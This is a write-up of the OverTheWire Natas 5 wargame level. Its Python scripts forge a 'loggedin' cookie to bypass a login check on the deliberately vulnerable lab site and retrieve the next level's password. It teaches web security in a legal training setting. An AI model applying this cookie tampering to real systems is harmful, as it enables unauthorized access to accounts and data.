# Writeup for [Natas 5 - Natas 6](http://natas5.natas.labs.overthewire.org) from [OverTheWire](https://overthewire.org)

We are prompted to a page that says that we aren't logged in.

![](./img/page.png)


The first thing I check for checking logins are `cookies`.

On the previous level, we used a tool called Burp Suite. But now we're going to do it with `Python` with the `requests` module.

```python
#!/usr/bin/env python3

import requests

url = 'http://natas5.natas.labs.overthewire.org/'

username = 'natas5'
password = '' # Password

r = requests.get( url, auth=(username, password) )

print(r.text)
```
And we see the exact same thing as the web page says, but in `HTML` form.

![](./img/page-req.png)

Now let's try viewing the cookie by adding `print(r.cookies)` to the end of the script.

Now we can see all of the `cookies` being used on this page.

![](./img/cookies.png)

It appears that there is a cookie called `loggedin` and it is set to 0, which is used by programmers to set something to `false`.

What we could do is try to set this cookie to `true` by setting it to 1. Our script should look like this.

```python
#!/usr/bin/env python3

import requests

url = 'http://natas5.natas.labs.overthewire.org/'

username = 'natas5'
password = '' # Password

cookies = {
	"loggedin" : "1"
}

r = requests.get( url, auth=(username,password),cookies=cookies )

print(r.text)
print(r.cookies)
```

Running this script, we can see that we successfully changed the `loggedin` cookie to be set to 1 and we got the password for the next level.

![](./img/password.png)